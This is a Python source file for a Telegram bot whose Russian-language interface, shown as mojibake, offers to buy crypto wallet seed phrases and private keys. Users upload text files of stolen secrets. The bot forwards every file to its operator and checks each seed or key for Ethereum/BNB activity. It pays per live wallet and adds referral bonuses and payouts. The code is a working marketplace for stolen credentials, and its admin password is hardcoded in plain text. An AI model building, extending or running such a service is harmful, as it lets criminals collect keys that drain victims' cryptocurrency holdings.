# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from dotenv import load_dotenv
import aiosqlite

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line, create_withdraw_request, get_pending_withdrawals,
    complete_withdrawal, get_withdrawals_by_date, get_withdrawal_stats
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity


class UploadFile(StatesGroup):
    waiting_file = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()


def humanize_size(size_bytes: int) -> str:
    for unit in ['B', 'KB', 'MB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f} GB"


MAX_FILE_SIZE = 20 * 1024 * 1024  # 20 MB

# --- –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã ---
main_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="üìÇ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª", callback_data="upload")],
    [InlineKeyboardButton(text="üë§ –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")],
    [InlineKeyboardButton(text="üë• –†–µ—Ñ–µ—Ä–∞–ª—ã", callback_data="referrals")],
    [InlineKeyboardButton(text="üí∞ –ë–∞–ª–∞–Ω—Å", callback_data="balance")],
    [InlineKeyboardButton(text="üí≥ –í—ã–≤–µ—Å—Ç–∏", callback_data="withdraw")],
    [InlineKeyboardButton(text="üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data="support")],
    [InlineKeyboardButton(text="‚ÑπÔ∏è –ü—Ä–∞–≤–∏–ª–∞", callback_data="rules")],
])

admin_panel = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")],
    [InlineKeyboardButton(text="üì§ –ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥", callback_data="admin_withdrawals")],
    [InlineKeyboardButton(text="üì© –ú–∞—Å—Å–æ–≤–∞—è —Ä–∞—Å—Å—ã–ª–∫–∞", callback_data="admin_broadcast")],
    [InlineKeyboardButton(text="üîô –í—ã—Ö–æ–¥", callback_data="admin_logout")],
])

back_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back")]
])


def get_withdrawal_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_admin")],
        [InlineKeyboardButton(text="üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data="admin_withdrawals")]
    ])

def get_request_keyboard(request_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="‚úÖ –í—ã–ø–ª–∞—á–µ–Ω–æ", callback_data=f"complete_withdraw_{request_id}")
        ],
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="admin_withdrawals")]
    ])


@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer_id = int(args[1].replace("ref_", ""))
        except:
            pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id and referrer_id != message.from_user.id:
        await register_referral(message.from_user.id, referrer_id)

    text = (
        "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</b>\n\n"
        "üõí <b>–°–∫—É–ø–∫–∞ SEED-—Ñ—Ä–∞–∑ –∏ Private-–∫–ª—é—á–µ–π</b> —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏ –≤ —Å–µ—Ç—è—Ö:\n"
        "‚Ä¢ <b>ERC-20 (Ethereum)</b>\n"
        "‚Ä¢ <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "üí∞ <b>–¶–µ–Ω—ã:</b>\n"
        "‚Ä¢ üå± SEED-—Ñ—Ä–∞–∑–∞ ‚Äî <b>235‚ÇΩ</b>\n"
        "‚Ä¢ üîë Private-key ‚Äî <b>145‚ÇΩ</b>\n\n"
        "üí∏ <b>–ü–õ–ê–¢–ò–ú –°–ê–ú–£–Æ –í–´–°–û–ö–£–Æ –¶–ï–ù–£</b> + <b>70% –æ—Ç –æ—Ç—Ä–∞–±–æ—Ç–∫–∏</b> –ø–æ–º–∏–º–æ –ø—Ä–∞–π—Å–∞!\n\n"
        "üïí <b>–í—ã–ø–ª–∞—Ç—ã –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –≤ 23:00 (–ú–°–ö)</b>"
    )
    await message.answer(text, reply_markup=main_menu)


@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer(
        "üìÇ –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª –≤ —Ñ–æ—Ä–º–∞—Ç–µ <b>.txt</b>.\n\n"
        "üìå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –¥–æ <b>20 –ú–ë</b>.\n"
        "üîç –ü—Ä–æ–≤–µ—Ä–∫–∞: —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å + –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å"
    )
    await state.set_state(UploadFile.waiting_file)


@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    # ‚úÖ –ú–ì–ù–û–í–ï–ù–ù–ê–Ø –û–¢–ü–†–ê–í–ö–ê –§–ê–ô–õ–ê –ê–î–ú–ò–ù–£
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"

    if document.file_size > MAX_FILE_SIZE:
        await message.answer("‚ùå –§–∞–π–ª –±–æ–ª—å—à–µ 20 –ú–ë.")
        await state.clear()
        return

    try:
        await bot.send_message(
            ADMIN_ID,
            f"üì© –ù–æ–≤—ã–π —Ñ–∞–π–ª –æ—Ç {user_info}\n"
            f"üìé <code>{document.file_name}</code> ({humanize_size(document.file_size)})",
            parse_mode='HTML'
        )
        await bot.send_document(ADMIN_ID, document.file_id)  # ‚ö° –ú–≥–Ω–æ–≤–µ–Ω–Ω–æ
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª: {e}")

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è
    if not document.file_name.endswith(".txt"):
        await message.answer("‚ùå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ <b>.txt</b> —Ñ–∞–π–ª—ã.")
        await state.clear()
        return

    await message.answer("üì• –°–∫–∞—á–∏–≤–∞—é –∏ –∞–Ω–∞–ª–∏–∑–∏—Ä—É—é —Ñ–∞–π–ª...")

    try:
        file = await bot.get_file(document.file_id)
        file_data = (await bot.download_file(file.file_path)).getvalue()
        content = file_data.decode("utf-8", errors="replace")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await message.answer("‚ùå –§–∞–π–ª –ø—É—Å—Ç.")
        await state.clear()
        return

    progress_msg = await message.answer(f"üîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å—Ç—Ä–æ–∫...\n‚úÖ –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: 0 / {total_lines} (0%)")

    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for i, line in enumerate(lines, 1):
        address = None
        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price

        if i % 5 == 0 or i == total_lines:
            percent = (i / total_lines) * 100
            try:
                await progress_msg.edit_text(
                    f"üîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å—Ç—Ä–æ–∫...\n"
                    f"‚úÖ –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {i} / {total_lines} ({int(percent)}%)"
                )
            except:
                pass

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"üéâ –†–µ—Ñ–µ—Ä–∞–ª –∑–∞—Ä–∞–±–æ—Ç–∞–ª {total_reward}‚ÇΩ\nüí∏ –í–∞–º +{bonus:.2f}‚ÇΩ")
            except: pass

    if total_reward > 0:
        text = (
            f'‚úÖ –§–∞–π–ª <b>"{document.file_name}"</b> –æ–±—Ä–∞–±–æ—Ç–∞–Ω!\n\n'
            f"üìä –ù–∞–π–¥–µ–Ω–æ:\n"
            f"   ‚Ä¢ üå± SEED: <b>{new_seeds}</b> √ó 235‚ÇΩ\n"
            f"   ‚Ä¢ üîë Keys: <b>{new_keys}</b> √ó 145‚ÇΩ\n\n"
            f"üìà –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            f"üí∞ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'‚ö†Ô∏è –í —Ñ–∞–π–ª–µ <b>"{document.file_name}"</b> –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤.\n\n'
            f"üìà –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            "‚ùå –ë–∞–ª–∞–Ω—Å –Ω–µ –ø–æ–ø–æ–ª–Ω–µ–Ω."
        )

    try:
        await progress_msg.edit_text(text)
    except:
        await message.answer(text, reply_markup=main_menu)

    await state.clear()


@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    try:
        await callback.answer()
        user = await get_user(callback.from_user.id)
        if not user:
            await get_or_create_user(callback.from_user.id, callback.from_user.username or "unknown")
            user = await get_user(callback.from_user.id)

        text = (
            f"üë§ <b>–ü—Ä–æ—Ñ–∏–ª—å</b>\n\n"
            f"üÜî ID: <code>{user['user_id']}</code>\n"
            f"üìù –°—Ç—Ä–æ–∫: {user['total_lines']}\n"
            f"üå± SEED: {user['unique_seeds']}\n"
            f"üîë Keys: {user['unique_keys']}\n"
            f"üí∞ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: {user['balance']:.2f} RUB"
        )

        if callback.message.text != text:
            await callback.message.edit_text(text, reply_markup=back_menu)
        else:
            await callback.answer()
    except Exception as e:
        print(f"üî¥ –û—à–∏–±–∫–∞: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–æ—Ñ–∏–ª—è.", reply_markup=back_menu)


@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user = await get_user(callback.from_user.id)
    if not user or user['balance'] <= 0:
        await callback.message.edit_text("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.", reply_markup=back_menu)
        return
    await callback.message.edit_text(
        f"üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å: <b>{user['balance']:.2f} RUB</b>\n\n"
        "–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ (–º–∏–Ω–∏–º—É–º 500‚ÇΩ):"
    )
    await state.set_state(WithdrawState.waiting_for_amount)


@dp.message(WithdrawState.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞ ‚Äî 500‚ÇΩ.")
            return
    except:
        await message.answer("‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
        return

    user = await get_user(message.from_user.id)
    if not user or amount > user['balance']:
        await message.answer("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.")
        await state.clear()
        return

    await state.update_data(amount=amount)
    await message.answer("üì® –í–≤–µ–¥–∏—Ç–µ –≤–∞—à BNB (BEP-20) –∞–¥—Ä–µ—Å:")


@dp.message(WithdrawState.waiting_for_address)
async def withdraw_address(message: Message, state: FSMContext):
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42 and all(c in "0123456789abcdefABCDEF" for c in address[2:])):
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç BNB-–∞–¥—Ä–µ—Å–∞.")
        return

    data = await state.get_data()
    amount = data['amount']
    user = message.from_user

    await create_withdraw_request(user.id, amount, address, user.username or f"ID:{user.id}")

    await message.answer(
        f"‚úÖ –ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ <b>{amount} RUB</b> –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\n"
        f"–ê–¥—Ä–µ—Å: <code>{address}</code>\n"
        "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –æ–±—Ä–∞–±–æ—Ç—É–µ—Ç –∑–∞–ø—Ä–æ—Å –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.",
        parse_mode="HTML",
        reply_markup=main_menu
    )
    await state.clear()


# --- –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å ---
@dp.message(F.text == "/admin")
async def admin_login_cmd(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("üîê –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:")
    await state.set_state(AdminState.waiting_for_password)


@dp.message(AdminState.waiting_for_password)
async def admin_password_check(message: Message, state: FSMContext):
    if message.text.strip() == "Linar1212@":
        await message.answer("‚úÖ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!", reply_markup=admin_panel)
        await state.clear()
    else:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å.")


@dp.callback_query(F.data == "admin_stats")
async def admin_stats_handler(callback: CallbackQuery):
    await callback.answer()
    stats = await get_stats()
    text = (
        "üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</b>\n\n"
        f"üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {stats['users']}\n"
        f"üìà –°—Ç—Ä–æ–∫: {stats['lines']}\n"
        f"üå± SEED: {stats['seeds']}\n"
        f"üîë Keys: {stats['keys']}\n"
        f"üí∏ –í—ã–ø–ª–∞—á–µ–Ω–æ: {stats['payout']:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=admin_panel)


@dp.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(callback: CallbackQuery):
    try:
        await callback.answer()
        requests = await get_pending_withdrawals()

        if not requests:
            stats = await get_withdrawal_stats()
            text = (
                "üì≠ <b>–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –∑–∞—è–≤–æ–∫</b>\n\n"
                f"üìä –í—Å–µ–≥–æ: {stats['total']} | ‚è≥: {stats['pending']} | ‚úÖ: {stats['completed']}"
            )
            await callback.message.edit_text(text, reply_markup=get_withdrawal_keyboard())
            return

        text = "üí∏ <b>–ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥</b>\n\n"
        for req in requests:
            text += (
                f"üÜî <code>{req['id']}</code>\n"
                f"üë§ <a href='tg://user?id={req['user_id']}'>{req['username']}</a>\n"
                f"üí∞ {req['amount']:.2f} RUB\n"
                f"üì§ <code>{req['address']}</code>\n"
                f"üìÖ {req['created_at']}\n"
                "‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
            )

        stats = await get_withdrawal_stats()
        text += f"\nüìä –í—Å–µ–≥–æ: {stats['total']} | ‚è≥: {stats['pending']} | ‚úÖ: {stats['completed']}"

        await callback.message.edit_text(text, reply_markup=get_withdrawal_keyboard(), disable_web_page_preview=True)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        await callback.message.edit_text("‚ùå –û—à–∏–±–∫–∞.", reply_markup=admin_panel)


@dp.callback_query(F.data.startswith("complete_withdraw_"))
async def complete_withdraw_handler(callback: CallbackQuery):
    try:
        request_id = int(callback.data.split("_")[-1])
        result = await complete_withdrawal(request_id)

        if not result:
            await callback.answer("‚ùå –£–∂–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞.")
            return

        user_id = result['user_id']
        amount = result['amount']

        try:
            await bot.send_message(
                user_id,
                f"‚úÖ –í–∞–º –≤—ã–ø–ª–∞—á–µ–Ω–æ <b>{amount:.2f} RUB</b>\n"
                "–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞!",
                parse_mode='HTML'
            )
        except:
            pass

        await callback.answer("‚úÖ –í—ã–ø–ª–∞—á–µ–Ω–æ!")
        await admin_withdrawals(callback)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        await callback.answer("–û—à–∏–±–∫–∞.")


@dp.callback_query(F.data == "back_to_admin")
async def back_to_admin(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:", reply_markup=admin_panel)


@dp.callback_query(F.data == "admin_logout")
async def admin_logout(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("üëã –í—ã –≤—ã—à–ª–∏.", reply_markup=main_menu)


@dp.message(F.text.startswith("/withdraws"))
async def filter_withdrawals_by_date_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        date_str = message.text.split()[1]
        requests = await get_withdrawals_by_date(date_str)

        if not requests:
            await message.answer("üì≠ –ù–µ—Ç –∑–∞—è–≤–æ–∫ –∑–∞ —ç—Ç—É –¥–∞—Ç—É.")
            return

        text = f"üìÖ <b>–ó–∞—è–≤–∫–∏ –∑–∞ {date_str}</b>\n\n"
        for req in requests:
            status = "‚úÖ" if req['status'] == 'completed' else "‚è≥"
            text += f"{status} {req['amount']:.2f} RUB ‚Üí {req['username']}\n"

        await message.answer(text)
    except IndexError:
        await message.answer("üìå –ò—Å–ø–æ–ª—å–∑—É–π: <code>/withdraws –ì–ì–ì–ì-–ú–ú-–î–î</code>")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")


# --- –ó–∞–ø—É—Å–∫ ---
async def main():
    await init_db()
    print("‚úÖ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
    print("üöÄ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    while True:
        try:
            await dp.start_polling(bot, drop_pending_updates=True)
            break
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
